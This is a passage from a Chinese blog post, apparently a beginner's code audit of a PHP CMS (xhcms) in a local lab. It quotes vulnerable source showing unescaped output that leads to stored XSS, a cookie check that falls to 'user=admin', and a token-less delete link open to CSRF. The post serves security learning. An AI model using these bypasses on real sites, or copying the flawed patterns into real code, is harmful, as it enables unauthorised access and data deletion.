punctuation">;</span><span class="token variable">$biao</span><span class="token operator">=</span><span class="token double-quoted-string string">"content"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>查看这些变量，查询语句是什么</p><pre class="language-php" data-language="php"><code class="language-php">$query1 = "SELECT * FROM $biao WHERE id='$fl_id'";$resul1 = mysql_query($query1) or die('SQL语句有误：'.mysql_error());$contentname = mysql_fetch_array($resul1); $xs=$list['xs'];if ($xs==1)&#123;$xs='<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>label label-success<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>显示<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>';&#125;else&#123;$xs='<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>label label-danger<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>隐藏<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>';&#125;if ($list['rcontent']&lt;>"")&#123;;$toutiao=' <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>label label-info<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>已回复<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>';&#125;else&#123;$toutiao=' ';&#125;if ($list['shebei']&lt;>"")&#123;;$shebei=' <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>label label-warning<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>'.$list['shebei'].'<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>';&#125;else&#123;$shebei=' ';&#125;?>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>                          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$list</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span><span class="token delimiter important">?></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>                          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span>  <span class="token variable">$list</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token delimiter important">?></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>                          <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$type</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token delimiter important">?></span></span>                          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$contentname</span> <span class="token punctuation">[</span><span class="token single-quoted-string string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>                          <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span>                          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$xs</span> <span class="token punctuation">.</span><span class="token variable">$toutiao</span><span class="token punctuation">.</span><span class="token variable">$shebei</span><span class="token punctuation">.</span><span class="token variable">$images</span><span class="token delimiter important">?></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>                          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span>  <span class="token function">date</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Y-m-d H:i'</span><span class="token punctuation">,</span><span class="token function">strtotime</span><span class="token punctuation">(</span><span class="token variable">$list</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'date'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>                          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>?r=reply&amp;type=<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$type</span><span class="token delimiter important">?></span></span>&amp;id=<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$list</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span><span class="token delimiter important">?></span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>btn btn-xs btn-warning<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>icon-pencil<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$fhlink</span><span class="token delimiter important">?></span></span>&amp;delete=<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$list</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span><span class="token delimiter important">?></span></span><span class="token punctuation">"</span></span> <span class="token attr-name">onClick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>return confirm(<span class="token punctuation">'</span>操作警告：\n\n请注意，删除可能会影响整个系统关联项\n\n您确定要删除吗？<span class="token punctuation">'</span>) <span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>btn btn-xs btn-danger<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>icon-remove<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>                          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>                          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>#<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>                          <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$type</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token delimiter important">?></span></span>                          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">colspan</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>4<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token delimiter important">?></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">colspan</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>3<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span>  <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$list</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'content'</span><span class="token punctuation">]</span><span class="token delimiter important">?></span></span>                          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>                          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$list</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'ip'</span><span class="token punctuation">]</span><span class="token delimiter important">?></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span>                      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tbody</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>widget-foot<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>pagination pull-left<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span><span class="token punctuation">></span></span>第 <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$page</span><span class="token delimiter important">?></span></span> - <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$Totalpage</span><span class="token delimiter important">?></span></span> 页 共 <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$Total</span><span class="token delimiter important">?></span></span> 条<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span></code></pre><p>依旧是没有过滤，直接将内容输出了。这里存在存储型的XSS。</p><p><strong>/files/content.php</strong>(不存在XSS，但是值得看一看)<br>此处的表单</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span>  <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>form<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/?r=submit&amp;type=comment&amp;cid=<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$id</span><span class="token delimiter important">?></span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>cid<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$id</span><span class="token delimiter important">?></span></span><span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>昵称<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token delimiter important">?></span></span><span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>邮箱<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mail<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'mail'</span><span class="token punctuation">]</span><span class="token delimiter important">?></span></span><span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>网址<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>url<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'url'</span><span class="token punctuation">]</span><span class="token delimiter important">?></span></span><span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>textarea</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>content<span class="token punctuation">"</span></span> <span class="token attr-name">cols</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">rows</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>textarea</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>save<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>提交<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>input2<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>code<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>验证码<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>randcode<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>yspan<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>../inc/code.class.php<span class="token punctuation">"</span></span> <span class="token attr-name">onClick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>this.src=this.src+<span class="token punctuation">'</span>?<span class="token punctuation">'</span>+Math.random();<span class="token punctuation">"</span></span> <span class="token attr-name">title</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>看不清楚?点击刷新验证码?<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>xx<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>jz<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>checkbox<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span> <span class="token attr-name">checked</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>checked<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span> 记住我的个人信息<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tz<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>checkbox<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span> <span class="token attr-name">checked</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>checked<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span> 回复后邮件通知我<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>qcfd<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><p>从代码中可以看出，在这里写的评论内容，存入<code>$content</code>变量中，然后通过<code>submit.php</code>来进行下一步处理</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token shell-comment comment">#submit.php中$content部分</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/([\x81-\xfe][\x40-\xfe])/"</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;Script language=JavaScript>alert('亲，再说点别的了吧？');history.back();&lt;/Script>"</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><img src="https://gitee.com/m0re/picture/raw/master/img/Snipaste_2021-05-03_16-08-52.png" loading="lazy"><br>直到这里，如果网址上没有<code>http://</code>，则加上<code>http://</code>，而且套接使用了<code>addslashes()</code>函数，进行了一些过滤，所以这里就不存在XSS了。<br>小总结就是<code>$name</code>也就是姓名处存在存储型XSS<br>**/files/concat.php**同上</p><h3 id="3-4-垂直越权"><a href="#3-4-垂直越权" class="headerlink" title="3.4 垂直越权"></a>3.4 垂直越权</h3><p>在<code>checklogin.php</code>中</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$user</span><span class="token operator">=</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">==</span><span class="token double-quoted-string string">""</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Location: ?r=login"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>如果COOKIE中user参数为空，那么就跳转到登陆窗。这样的话越权就很轻松了，我们访问一个需要管理员权限的页面，例如<a href="http://127.0.0.1/xhcms/admin/?r=editlink">http://127.0.0.1/xhcms/admin/?r=editlink</a><br>抓包在COOKIE后面添加user=admin即可实现越权。<br><img src="https://gitee.com/m0re/picture/raw/master/img/Snipaste_2021-05-03_16-19-38.png" loading="lazy"><br>查看浏览器中返回信息</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/Snipaste_2021-05-03_16-21-08.png" loading="lazy"></p><h3 id="3-5-CSRF漏洞"><a href="#3-5-CSRF漏洞" class="headerlink" title="3.5 CSRF漏洞"></a>3.5 CSRF漏洞</h3><p><strong>/admin/files/wzlist.php</strong><br>以此处的一个删除功能为例</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$delete</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'delete'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$delete</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token double-quoted-string string">""</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$query</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"DELETE FROM content WHERE id='<span class="token interpolation"><span class="token variable">$delete</span></span>'"</span><span class="token punctuation">;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'SQL语句有误：'</span><span class="token punctuation">.</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;script>alert('亲，ID为"</span><span class="token punctuation">.</span><span class="token variable">$delete</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"的内容已经成功删除！');location.href='?r=wzlist'&lt;/script>"</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></code></pre><p>这里发现它是没有其它的后续操作了，就删除之后没有其它验证。<br>抓包查看<br><img src="https://gitee.com/m0re/picture/raw/master/img/Snipaste_2021-05-03_17-39-07.png" loading="lazy"></p><p>数据包中也没有防护，比如设置token进行验证身份。<br>复制它的链接，也就是删除该文章所需要执行的操作。<br><a href="http://127.0.0.1/xhcms/admin/?r=wzlist&amp;delete=18">http://127.0.0.1/xhcms/admin/?r=wzlist&amp;delete=18</a><br>在管理员登录状态下点击，即可删除对应文章。<br>这里我换个浏览器进行操作<br><img src="https://gitee.com/m0re/picture/raw/master/img/Snipaste_2021-05-03_17-43-18.png" loading="lazy"></p><p>这个漏洞可以和垂直越权漏洞结合使用。</p><h2 id="0x04-复现总结"><a href="#0x04-复现总结" class="headerlink" title="0x04 复现总结"></a>0x04 复现总结</h2><p>一、 代码审计就是有点费头发<br>二、 虽然这个是入门，但是对于我这样的审计新手来说，工作量还是比较大的。倒是不难，就是与平时的CTF有点不一样，不过毕竟算一个真实的环境。<br>三、 工具使用固然重要，但是手工才是代码审计的特殊所在。有些就必须人工来做，扫描工具无法做到的事情。<br>四、一些危险函数，有的虽然在本文件可能没什么发现，这个时候需要去看看与它关联的其它文件看看有无可以用的点。</p><p>审计新手，复现过程比较简单，师傅们轻点喷。</p>]]></content>
      
      
